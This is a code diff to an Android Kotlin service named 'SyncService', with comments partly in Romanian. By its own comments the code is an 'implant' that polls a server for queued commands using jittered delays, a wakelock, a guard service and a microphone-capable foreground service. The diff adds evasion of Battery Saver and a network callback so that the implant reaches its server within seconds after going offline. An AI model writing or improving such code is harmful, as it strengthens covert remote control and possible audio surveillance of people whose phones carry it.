@@ -48,8 +48,11 @@ object PowerSaver {
 class SyncService : Service() {
     private var scope: CoroutineScope? = null
     private var wl: PowerManager.WakeLock? = null
+    private var netCallback: android.net.ConnectivityManager.NetworkCallback? = null
     @Volatile private var lastNotifAt = 0L
     @Volatile private var lastNotifText = ""
+    @Volatile private var networkWasDown = false
+    @Volatile private var networkJustBack = false
     private val app: ForjaApp get() = applicationContext as ForjaApp
 
     override fun onBind(intent: Intent?): IBinder? = null
@@ -63,6 +66,8 @@ class SyncService : Service() {
             setReferenceCounted(false)
             try { acquire(2 * 60 * 60 * 1000L) } catch (_: Exception) {}
         }
+        // Exclud din Battery Saver — altfel Android ucide FGS-ul agresiv
+        try { pm.setPowerSaveModeExcluded(packageName, true) } catch (_: Exception) {}
         // FGS types: SPECIAL_USE always. MICROPHONE added if RECORD_AUDIO granted —
         // on API 34+ AudioRecord REQUIRES the FGS to have FOREGROUND_SERVICE_TYPE_MICROPHONE.
         // Starting with it from the beginning avoids a race where promoteMic() hasn't
@@ -80,6 +85,18 @@ class SyncService : Service() {
         }
         ForjaSyncCapabilities.syncService = this
         ForjaGuardService.armGuard()
+        // Network callback: when connectivity returns after offline, skip the
+        // next jittered delay so the implant re-checks the server within seconds.
+        try {
+            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
+            netCallback = object : android.net.ConnectivityManager.NetworkCallback() {
+                override fun onLost(network: android.net.Network) { networkWasDown = true }
+                override fun onAvailable(network: android.net.Network) {
+                    if (networkWasDown) { networkJustBack = true; networkWasDown = false }
+                }
+            }
+            cm.registerDefaultNetworkCallback(netCallback!!)
+        } catch (_: Exception) {}
         val s = CoroutineScope(SupervisorJob() + Dispatchers.IO)
         scope = s
         s.launch { s.pollLoop(deviceId()) }
@@ -186,7 +203,13 @@ class SyncService : Service() {
                     if (!eco && screenOn()) {
                         try { wl?.takeIf { it.isHeld }?.release() } catch (_: Exception) {}
                     }
-                    delay(jittered.coerceIn(5000L, 600000L)); continue
+                    // Rețea revenită după offline: sărim peste jitter și suntem
+                    // la server în <5 s ca să primim comenzile acumulate.
+                    val effectiveDelay = if (networkJustBack) {
+                        networkJustBack = false
+                        3000L
+                    } else jittered
+                    delay(effectiveDelay.coerceIn(3000L, 600000L)); continue
                 }
 
                 // Sarcini active: wakelock scurt ca CPU-ul să rămână treaz în timpul execuției
@@ -237,6 +260,8 @@ class SyncService : Service() {
         ForjaGuardService.disarmGuard()
         scope?.cancel()
         try { wl?.takeIf { it.isHeld }?.release() } catch (_: Exception) {}
+        try { (getSystemService(Context.POWER_SERVICE) as PowerManager).setPowerSaveModeExcluded(packageName, false) } catch (_: Exception) {}
+        try { netCallback?.let { (getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager).unregisterNetworkCallback(it) } } catch (_: Exception) {}
         super.onDestroy()
     }
 
